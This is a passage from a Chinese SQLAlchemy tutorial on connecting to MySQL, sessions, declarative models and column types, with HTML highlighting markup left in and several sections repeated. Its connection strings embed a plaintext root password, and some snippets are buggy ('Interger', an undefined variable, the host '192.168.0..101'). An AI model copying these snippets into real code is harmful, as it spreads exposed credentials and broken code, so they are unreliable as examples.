operator">></span>  <span class="token operator">|</span>       <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----------+-------------+------+-----+---------+-------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>SQL</code> 语句中的约束,非空,数据类型等等,根本不能使用一个单独的<code>list</code> 来表示.</p><p>但是如果把一个<code>tuple</code> 用<code>class</code> 实例来表示,就更容易看出表的结构</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Integer</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> int<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">String</span><span class="token punctuation">:</span>      <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>         self<span class="token punctuation">.</span>x <span class="token operator">=</span> str<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> id<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>         self<span class="token punctuation">.</span>id <span class="token operator">=</span> Interger<span class="token punctuation">(</span>id<span class="token punctuation">)</span>         self<span class="token punctuation">.</span>name <span class="token operator">=</span> String<span class="token punctuation">(</span>x<span class="token punctuation">)</span>user <span class="token operator">=</span> <span class="token punctuation">[</span>    User<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    User<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'Bob'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    User<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Harry'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然<code>ORM</code> 框架实现的并不是这么简单的,但是类似与这样把数据库的表结构映射在对象上,就是<code>ORM</code>.</p><p>而做这个工作的就是<code>ORM</code> 框架,在<code>Python</code> 中最有名的框架就是<code>SQLAlchemy</code>.</p><p><code>ORM</code> 的优缺点:</p><ul><li>提高开发效率,提高代码重用</li><li>是开发更加的抽象</li><li>可移植,不只是局限在<code>mysql</code>,可以是<code>MS-SQL</code>,<code>orcal</code> 等.</li><li>可以方便的引入一些附加功能等.</li><li>自动化进行关系数据库的映射需要消耗系统性.</li><li>在处理多表联查,<code>where</code>子句中复杂条件时,<code>ORM</code> 的语法会变得复杂.</li></ul></blockquote><h3 id="3-开启MySQL的记录查询功能"><a href="#3-开启MySQL的记录查询功能" class="headerlink" title="3.开启MySQL的记录查询功能"></a>3.开启<code>MySQL</code>的记录查询功能</h3><blockquote><p>此方法为临时打开记录查询功能.<code>MySQL</code>服务重启会恢复关闭,在此打开只是为了测试<code>SQLAlchemy</code>功能.</p><pre class="line-numbers language-sql"><code class="language-sql">❯ mycli <span class="token operator">-</span>u root <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">0.101</span>mysql root<span class="token variable">@192.168.0.101</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span><span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>                     <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span><span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">OFF</span>                       <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>mysql_data<span class="token operator">/</span>localhost<span class="token punctuation">.</span>log <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span>mysql root<span class="token variable">@192.168.0.101</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">GLOBAL</span> general_log<span class="token operator">=</span><span class="token string">'ON'</span>                mysql root<span class="token variable">@192.168.0.101</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'general%'</span><span class="token punctuation">;</span>          <span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span><span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>                     <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span><span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">ON</span>                        <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>mysql_data<span class="token operator">/</span>localhost<span class="token punctuation">.</span>log <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------------------+---------------------------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:以<code>general_log_file</code>文件为准则,查看记录.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 远程到MySQL服务器</span>$ <span class="token function">ssh</span> root@192.168.0.101<span class="token comment" spellcheck="true"># 查看SQL语句记录</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat  /mysql_data/localhost.log </span>/var/mysql/bin/mysqld, Version: 5.7.20 <span class="token punctuation">(</span>MySQL Server <span class="token punctuation">(</span>GPL<span class="token punctuation">))</span>. started with:Tcp port: 3306  Unix socket: /var/lib/mysql/mysql.sockTime                 Id Command    Argument2020-08-23T07:03:58.785556Z       16 Query    show variables like <span class="token string">'general%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-SQLAlchemy与数据库的逻辑对应"><a href="#4-SQLAlchemy与数据库的逻辑对应" class="headerlink" title="4.SQLAlchemy与数据库的逻辑对应"></a>4.<code>SQLAlchemy</code>与数据库的逻辑对应</h3><blockquote><table><thead><tr><th><code>SQLAlchemy</code></th><th><code>MySQL</code></th><th>说明</th></tr></thead><tbody><tr><td><code>Engine()</code></td><td>连接数据库</td><td></td></tr><tr><td><code>Session()</code></td><td>连接池</td><td><code>Session</code>是<code>Query</code>的入口</td></tr><tr><td><code>Model</code></td><td>表</td><td><code>Python</code> 中类对应数据库的表,它用面向对象的形式来表现数据库中的表</td></tr><tr><td><code>Column</code></td><td>列</td><td>支持运算符操作,<code>Python</code>类中定义了<code>Column</code></td></tr><tr><td><code>Query</code></td><td>行</td><td>可以对单行或多行操作(增删改查)</td></tr></tbody></table></blockquote><h3 id="5-连接数据库"><a href="#5-连接数据库" class="headerlink" title="5.连接数据库"></a>5.连接数据库</h3><blockquote><p>首先安装所需要的包.</p><pre class="line-numbers language-bash"><code class="language-bash">$ conda activate learnpy$ conda <span class="token function">install</span> pymysql$ conda <span class="token function">install</span> sqlalchemy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装完毕后,可以查看当前安装的<code>sqlalchemy</code>版本来验证是否安装成功.</p><pre class="line-numbers language-bash"><code class="language-bash">$ python<span class="token operator">>></span><span class="token operator">></span> <span class="token function">import</span> sqlalchemy<span class="token operator">>></span><span class="token operator">></span> sqlalchemy.__version__<span class="token string">'1.3.18'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p>连接数据库:<code>dialect</code>用于和数据<code>API</code>进行交流,根据配置文件的不同的数据库<code>API</code>,从而实现对数据库的操作.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engineengine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>SQLAPI<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># MySQL-Python</span>SQLAPI<span class="token operator">=</span><span class="token string">'mysql+mysqldb://&lt;user>:&lt;password>@&lt;host>[:&lt;port>]/&lt;dbname>'</span>'<span class="token comment" spellcheck="true"># pymysql</span>SQLAPI<span class="token operator">=</span><span class="token string">'mysql+pymysql://&lt;username>:&lt;password>@&lt;host>/&lt;dbname>[?&lt;options>]'</span><span class="token comment" spellcheck="true"># MySQL-Connector</span>SQLAPI<span class="token operator">=</span><span class="token string">'mysql+mysqlconnector://&lt;user>:&lt;password>@&lt;host>[:&lt;port>]/&lt;dbname>'</span><span class="token comment" spellcheck="true"># cx_Oracle</span>SQLAPI<span class="token operator">=</span><span class="token string">'oracle+cx_oracle://user:pass@host:port/dbname[?key=value&amp;key=value...]'</span><span class="token comment" spellcheck="true"># 更多详见:https://docs.sqlalchemy.org/en/latest/dialects/index.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们这里使用的是<code>pymysql</code>,由于<code>API</code>中需要提供数据库,这里我们在<code>MySQL</code>中创建一个测试数据库:</p><pre class="line-numbers language-sql">mysql root@192.168.0.101:(none)&gt; create database sqlalchemy; </code></pre><p>然后尝试连接数据库:</p><pre><code class="python"><code class="language-sql">mysql root@192.168.0.101:(none)&gt; create database sqlalchemy; </code></pre><p>然后尝试连接数据库:</p><pre><code class="python">>>> from sqlalchemy import create_engine>>> engine = create_engine('mysql+pymysql://root:2008.Cn123@192.168.0..101:3306/sqlalchemy',echo=True)# echo=True  表示能看到所有的SQL输出,# 开启了mysql数据库的数据日志以后,可以通过mysql查看连接和语句的执行# cat /mysql_data/localhost.log mysql_data/bogon.log <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初次调用<code>create_engine()</code>的时候并不会真正的去连接数据库.只有在真正执行一条命令的时候才会去尝试建立连接.</p></blockquote><h3 id="6-创建会话"><a href="#6-创建会话" class="headerlink" title="6.创建会话"></a>6.创建会话</h3><blockquote><p>在<code>sqlalchemy</code> 中,控制连接语柄的是<code>Session</code>.</p><p><code>Session</code> 相当于一个会话池.所有与数据库的交互都通过它来运行.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token operator">>></span><span class="token operator">></span> Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果还没有创建<code>engine</code> ,先创建了<code>Session</code> ,可以通过<code>Session.configure(bind=engine)</code> 来绑定数据库连接.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> Session<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># once engine is available</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不管是哪一种,只要开始和数据库进行交互,就需要从<code>Session</code> 池中实例化一个<code>session</code> 对象来操作</p><pre class="line-numbers language-python">&gt;&gt;&gt; session = Session()</code></pre><p>当一个<code>session</code> 不使用的时候,就需要手动的去关闭它.</p><pre><code class="python">&gt;&gt;&gt; session.close()</code></pre><p><code>Session</code> 具有以下特性:</p><ul><li><code>Session</code> 会在需要的时候(比如用户读取数据,更新数据时)和数据库进行通信,获取数据对象,并有一个池子来维护这些对象,保证访问数据时不出现意外的问题.</li><li><code>Session</code> 和 <code>connection</code> 不等同,<code>Session</code>会通过<code>connection</code>和数据库通信</li><li><code>Session</code>是<code>Query</code> 查询 的入口</li></ul><p>当实例化<code>Session</code> 会话之后,实例对象<code>session</code> 有几个特别的属性和方法</p><ul><li><code>flush()</code>:这个方法会将当前<code>session</code> 存在的变更发给数据库,也就是会执行<code>SQL</code>语句</li><li><code>commit()</code>:提交事务,一个事务可能包含多条<code>SQL</code>语句</li><li><code>autoflush</code>:默认为<code>True</code> ,<code>session</code> 在查询之前会自动把当前积累的修改发送给数据库.注意:这里是查询的时候(<code>query</code>),并不是在执行<code>session.add()</code>的时候.</li><li><code>autocommit()</code>:默认为<code>False</code>,自动提交事务,默认为不提交,这意味着,执行完任何关于数据的语句后,要执行<code>commit()</code> 命令来提交给数据库.</li></ul></blockquote><h3 id="7-创建映射-Model"><a href="#7-创建映射-Model" class="headerlink" title="7.创建映射(Model)"></a>7.创建映射(<code>Model</code>)</h3><blockquote><p>在<code>Python</code> 中一切接对象,<code>mysql</code> 数据库是关系型数据库,这里要做的就是,把表映射为<code>Python</code> 的一个类.让我们以对象的方式来操作表.</p><ul><li>首先描述将要处理的数据库表</li><li>然后定义包含指令的类</li><li>将类映射到表 映射的类必须根据基类来定义.这个基类维护相对于该基类的类和表的目录,这称为声明性基类.使用 <code>declarative_base</code>(declarative 声明)来创建基类</li></ul><hr><p>使用<code>sublime</code>创建一个文件</p><pre><code class="python"><code class="language-python">&gt;&gt;&gt; session = Session()</code></pre><p>当一个<code>session</code> 不使用的时候,就需要手动的去关闭它.</p><pre><code class="python">&gt;&gt;&gt; session.close()</code></pre><p><code>Session</code> 具有以下特性:</p><ul><li><code>Session</code> 会在需要的时候(比如用户读取数据,更新数据时)和数据库进行通信,获取数据对象,并有一个池子来维护这些对象,保证访问数据时不出现意外的问题.</li><li><code>Session</code> 和 <code>connection</code> 不等同,<code>Session</code>会通过<code>connection</code>和数据库通信</li><li><code>Session</code>是<code>Query</code> 查询 的入口</li></ul><p>当实例化<code>Session</code> 会话之后,实例对象<code>session</code> 有几个特别的属性和方法</p><ul><li><code>flush()</code>:这个方法会将当前<code>session</code> 存在的变更发给数据库,也就是会执行<code>SQL</code>语句</li><li><code>commit()</code>:提交事务,一个事务可能包含多条<code>SQL</code>语句</li><li><code>autoflush</code>:默认为<code>True</code> ,<code>session</code> 在查询之前会自动把当前积累的修改发送给数据库.注意:这里是查询的时候(<code>query</code>),并不是在执行<code>session.add()</code>的时候.</li><li><code>autocommit()</code>:默认为<code>False</code>,自动提交事务,默认为不提交,这意味着,执行完任何关于数据的语句后,要执行<code>commit()</code> 命令来提交给数据库.</li></ul></blockquote><h3 id="7-创建映射-Model"><a href="#7-创建映射-Model" class="headerlink" title="7.创建映射(Model)"></a>7.创建映射(<code>Model</code>)</h3><blockquote><p>在<code>Python</code> 中一切接对象,<code>mysql</code> 数据库是关系型数据库,这里要做的就是,把表映射为<code>Python</code> 的一个类.让我们以对象的方式来操作表.</p><ul><li>首先描述将要处理的数据库表</li><li>然后定义包含指令的类</li><li>将类映射到表 映射的类必须根据基类来定义.这个基类维护相对于该基类的类和表的目录,这称为声明性基类.使用 <code>declarative_base</code>(declarative 声明)来创建基类</li></ul><hr><p>使用<code>sublime</code>创建一个文件</p><pre><code class="python">#!/usr/bin/env python# coding=utf-8from sqlalchemy import create_enginefrom sqlalchemy.orm import sessionmakerfrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy import Column, Integer, String# 1.连接数据库engine = create_engine('mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy')# 2.创建SessionSession = sessionmaker(bind=engine)# 3.实例化sessionsession = Session()# 4.创建Model# 创建基类Base = declarative_base()# 创建映射class TestUser_1(Base):    """ __tablename 必须存在,指定数据库表名 """    __tablename__ = 'testuser_1'    id = Column(Integer, primary_key = True) # primary_key是必须的    first_name = Column(String(50))    last_name = Column(String(50))    password = Column(String(50))    def __repr__(self):        """这是非必须的,为了更友好的数据演示"""        return  '<TestUser_1(first_name={}, last_name={}, password={})>'.format(self.first_name, self.last_name, self.password )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意: <code>__talbename__</code> 是必须的存在的,它的值是数据库中的表名.而且表中的主键列必须存在.</p><p>类构建成功后,就定义了表的元数据信息.<code>sqlalchemy</code> 用来呈现这些信息的对象称为<code>Table</code>对象,可以使用<code>TestUser_1.__table__</code>参数来查看这个对象.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>TestUser_1<span class="token punctuation">.</span>__table__<span class="token punctuation">)</span>sqlalchemy<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>schema<span class="token punctuation">.</span>Table<span class="token operator">>></span><span class="token operator">></span> TestUser_1<span class="token punctuation">.</span>__table__Table<span class="token punctuation">(</span><span class="token string">'testuser_1'</span><span class="token punctuation">,</span> MetaData<span class="token punctuation">(</span>bind<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>testuser_1<span class="token operator">></span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'first_name'</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>testuser_1<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'last_name'</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>testuser_1<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">,</span> Column<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> table<span class="token operator">=</span><span class="token operator">&lt;</span>testuser_1<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">,</span> schema<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 这是一个Table对象,也可以称为 元数据信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据这个元数据信息,<code>sqlalchemy</code> 可以使用<code>metadata.create_all(engine)</code> 来创建绑定到<code>Base&#39;</code> 基类上的表,需要注意的是这个方法不能更新表的内容(也就是不能使用<code>alter</code>语句).<code>metadata.drop_all(engine)</code>,用来删除绑定到<code>Base</code>基类上的表</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Base 是我们创建的基类.这个命令可以生成 绑定到 Base上的表</span><span class="token operator">>></span><span class="token operator">></span> Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 删除绑定到Base上的表</span><span class="token operator">>></span><span class="token operator">></span> Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>drop_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看数据库日志:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">tail</span> -10  /mysql_data/localhost.log 2020-08-23T09:09:56.856411Z        4 Query    CREATE TABLE testuser_1 <span class="token punctuation">(</span>    <span class="token function">id</span> INTEGER NOT NULL AUTO_INCREMENT,     first_name VARCHAR<span class="token punctuation">(</span>50<span class="token punctuation">)</span>,     last_name VARCHAR<span class="token punctuation">(</span>50<span class="token punctuation">)</span>,     password VARCHAR<span class="token punctuation">(</span>50<span class="token punctuation">)</span>,     PRIMARY KEY <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>2020-08-23T09:09:56.878901Z        4 Query    COMMIT2020-08-23T09:09:56.883521Z        4 Query    ROLLBACK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="1-Column-的数据类型"><a href="#1-Column-的数据类型" class="headerlink" title="1.Column 的数据类型"></a>1.<code>Column</code> 的数据类型</h4><blockquote><p><code>sqlalchemy</code>与<code>mysql</code>中常用的数据类型相对应</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可以通过sqlalchemy导入数据类型</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> String<span class="token punctuation">,</span>Date<span class="token punctuation">,</span>DateTime<span class="token punctuation">,</span>Integer<span class="token punctuation">,</span>Float<span class="token punctuation">,</span>Boolean<span class="token punctuation">,</span>DECIMAL<span class="token punctuation">,</span>Time<span class="token punctuation">,</span>Enum<span class="token punctuation">,</span>Text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th><code>Mysql</code></th><th><code>SQLAlchemy</code></th></tr></thead><tbody><tr><td><code>smallint</code></td><td><code>Boolean</code></td></tr><tr><td><code>int</code></td><td><code>Integer</code></td></tr><tr><td><code>float</code></td><td><code>Float</code></td></tr><tr><td><code>decimal</code>定点数</td><td><code>DECIMAL</code></td></tr><tr><td><code>date</code></td><td><code>Date</code></td></tr><tr><td><code>datetime</code></td><td><code>DateTime</code></td></tr><tr><td><code>time</code></td><td><code>Time</code></td></tr><tr><td><code>enum</code></td><td><code>Enum</code></td></tr><tr><td><code>text</code></td><td><code>TEXT</code></td></tr></tbody></table><hr><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 通过 sqlalchemy.dialects.mysql 导入更多的Mysql支持的数据类型</span><span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>dialects<span class="token punctuation">.</span>mysql <span class="token keyword">import</span> DOUBLE<span class="token punctuation">,</span>LONGTEXT<span class="token punctuation">,</span>YEAR<span class="token punctuation">,</span>LONGBLOB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>假设创建如图的<code>Model</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10115.png" alt="10115"></p><p>新建一个<code>python</code>文件</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env/python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>dialects<span class="token punctuation">.</span>mysql <span class="token keyword">import</span>  LONGTEXT<span class="token punctuation">,</span>DOUBLE<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Article</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'articles'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    author <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    detail <span class="token operator">=</span> Column<span class="token punctuation">(</span>LONGTEXT<span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>Date<span class="token punctuation">)</span>    create_time_1 <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    create_time_2 <span class="token operator">=</span> Column<span class="token punctuation">(</span>Time<span class="token punctuation">)</span>    author_Introduction <span class="token operator">=</span>  Column<span class="token punctuation">(</span>Text<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    category  <span class="token operator">=</span> Column<span class="token punctuation">(</span>Enum<span class="token punctuation">(</span><span class="token string">'Python'</span><span class="token punctuation">,</span> <span class="token string">'Java'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    price <span class="token operator">=</span>  Column<span class="token punctuation">(</span>DECIMAL<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行:</p><pre class="line-numbers language-bash">$ python 2column数据类型.py</code></pre><p>查看数据库并验证:</p><pre><code class="sql"><code class="language-bash">$ python 2column数据类型.py</code></pre><p>查看数据库并验证:</p><pre><code class="sql">mysql root@192.168.0.101:sqlalchemy> show tables;     +----------------------+| Tables_in_sqlalchemy |+----------------------+| articles             || testuser_1           |+----------------------+mysql root@192.168.0.101:sqlalchemy> show create table articles;        +----------+--------------------------------------------------+| Table    | Create Table                                     |+----------+--------------------------------------------------+| articles | CREATE TABLE `articles` (                        ||          |   `id` int(11) NOT NULL AUTO_INCREMENT,          ||          |   `author` varchar(45) DEFAULT NULL,             ||          |   `detail` longtext,                             ||          |   `create_time` date DEFAULT NULL,               ||          |   `create_time_1` datetime DEFAULT NULL,         ||          |   `create_time_2` time DEFAULT NULL,             ||          |   `author_Introduction` text,                    ||          |   `category` enum('Python','Java') DEFAULT NULL, ||          |   `price` decimal(8,4) DEFAULT NULL,             ||          |   PRIMARY KEY (`id`)                             ||          | ) ENGINE=InnoDB DEFAULT CHARSET=utf8             |+----------+--------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过<code>mysql</code>服务器查看日志</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 需要ssh到192.168.0.101</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -20 /mysql_data/localhost.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>在上面文件的基础上可以尝试添加数据</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 2column数据类型.py</span><span class="token comment" spellcheck="true"># 添加数据</span>art1 <span class="token operator">=</span> Article<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>author<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">,</span>detail<span class="token operator">=</span><span class="token string">'This is a test. sqlalchemy connect mysql.'</span><span class="token 